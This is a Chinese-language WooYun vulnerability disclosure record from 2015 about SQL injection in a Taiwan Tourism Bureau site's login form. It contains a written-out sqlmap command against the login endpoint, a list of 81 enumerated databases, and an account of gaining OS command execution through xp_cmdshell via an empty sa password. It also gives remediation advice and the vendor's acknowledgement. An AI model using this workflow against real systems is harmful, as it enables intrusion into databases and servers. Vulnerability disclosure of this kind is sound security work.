{"id": 77677, "wybug_id": "wooyun-2015-0161995", "wybug_title": "台湾交通部观光局某分站SQL注射漏洞（臺灣地區）", "wybug_corp": "Hitcon台湾互联网漏洞报告平台", "wybug_author": "TouchEvil", "wybug_date": "2015-12-17 11:36", "wybug_open_date": "2016-02-01 19:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-01：\t细节向公众公开  简要描述： 侧漏大量数据库 详细说明：  台湾交通部觀光局行動導覽管理系統 http://**.**.**.**\n\n登录框“账号”存在SQL注射漏洞用万能密码直接可进入后台，如下图\n\n\n\n使用sqlmap跑一下注入点\nsqlmap -u \"http://**.**.**.**/MobileService_tourism/manager/login_submit.asp\" --data \"login_id=123&passwd=132\" -p login_id\n\n\n\n\n\navailable databases [81]:                                                                                                                            [*] ALMANAC[*] aspnetdb[*] bike_talk[*] bike_traval[*] bk[*] EastCoastNsa[*] Ec_Bike2Taiwan[*] ECNSA-GreenPack[*] EcnsaAdmin[*] EcnsaTour[*] GUA[*] Happiness[*] happystay[*] HotSpring[*] MAOLIN01[*] MAOLIN02[*] master[*] MobileService_Tourism[*] model[*] msdb[*] NEYC02[*] NGN01[*] NGN_B[*] PENGHU01[*] Penghu2014[*] PengHu_Blog[*] Penghu_wcm[*] PenghuAct01[*] PenghuStars[*] pkstar[*] ReportServer[*] ReportServerTempDB[*] SML02[*] SML_Event01[*] Southwest_OATB[*] SouthwestCoast_new[*] SouthwestCoastPic[*] SunMoonLake_wcm[*] sw_volunteer[*] SWApply_old[*] SWCOAST01[*] swcoast_act2[*] swcoast_new[*] Swcoast_VE[*] SwcoastDisability[*] tbroc05[*] TBROC09[*] TBROC15[*] TBROC16[*] TBROC17_Old[*] TBROC18[*] TBROC19[*] tbroc21_ephoto[*] TBROC23[*] TBROC26[*] TBROC31[*] TBROC32[*] TBROC33[*] TBROC36_JobServiceDB[*] TBROC36_TAMS2_LOG[*] TBROC36_TAMS2_RPT[*] TBROC36_TAMS2_SEC[*] TBROC37[*] TBROC38[*] TBROC39[*] TBROC40[*] TBROC41[*] TBROC42[*] TBROC43_JobServiceDB[*] TBROC43_TAMS2_LOG[*] TBROC43_TAMS2_RPT[*] TBROC43_TAMS2_SEC[*] TBROC46[*] tempdb[*] thsf[*] tour101_db[*] trimt2010[*] Trimt_areadb[*] Trimt_WCM[*] TrimtAct[*] XingHao\n直接使用sqlmap的--os-shell参数，调用系统命令，发现加载xp_cmdshell失败\n\n查看数据库账号和密码，发现sa账号为空密码\n\n切换到sa账号，加载xp_cmdshell成功\n\n\n\n查看乌云中之前有位基友发现过该观光局另外一分站漏洞（http://**.**.**.**/bugs/wooyun-2010-0143537）该基友当时测试的地址是： **.**.**.**  当时该分站注射出的数据库有78个。经对比应该为同一个数据库，但是两个分站的IP如下：**.**.**.**:**.**.**.****.**.**.**:**.**.**.**猜测应该是同一台数据库服务器，当时只是修复了gis分站的sql注射，但是sa账号密码为空如果不修复的话仍然会存在风险。   漏洞证明：  \navailable databases [81]:                                                                                                                            [*] ALMANAC[*] aspnetdb[*] bike_talk[*] bike_traval[*] bk[*] EastCoastNsa[*] Ec_Bike2Taiwan[*] ECNSA-GreenPack[*] EcnsaAdmin[*] EcnsaTour[*] GUA[*] Happiness[*] happystay[*] HotSpring[*] MAOLIN01[*] MAOLIN02[*] master[*] MobileService_Tourism[*] model[*] msdb[*] NEYC02[*] NGN01[*] NGN_B[*] PENGHU01[*] Penghu2014[*] PengHu_Blog[*] Penghu_wcm[*] PenghuAct01[*] PenghuStars[*] pkstar[*] ReportServer[*] ReportServerTempDB[*] SML02[*] SML_Event01[*] Southwest_OATB[*] SouthwestCoast_new[*] SouthwestCoastPic[*] SunMoonLake_wcm[*] sw_volunteer[*] SWApply_old[*] SWCOAST01[*] swcoast_act2[*] swcoast_new[*] Swcoast_VE[*] SwcoastDisability[*] tbroc05[*] TBROC09[*] TBROC15[*] TBROC16[*] TBROC17_Old[*] TBROC18[*] TBROC19[*] tbroc21_ephoto[*] TBROC23[*] TBROC26[*] TBROC31[*] TBROC32[*] TBROC33[*] TBROC36_JobServiceDB[*] TBROC36_TAMS2_LOG[*] TBROC36_TAMS2_RPT[*] TBROC36_TAMS2_SEC[*] TBROC37[*] TBROC38[*] TBROC39[*] TBROC40[*] TBROC41[*] TBROC42[*] TBROC43_JobServiceDB[*] TBROC43_TAMS2_LOG[*] TBROC43_TAMS2_RPT[*] TBROC43_TAMS2_SEC[*] TBROC46[*] tempdb[*] thsf[*] tour101_db[*] trimt2010[*] Trimt_areadb[*] Trimt_WCM[*] TrimtAct[*] XingHao\n   修复方案：  1、对所有输入参数进行过滤；2、sa密码不为空。   版权声明：转载请注明来源 TouchEvil@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-12-18 21:54 厂商回复： 感謝通報 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}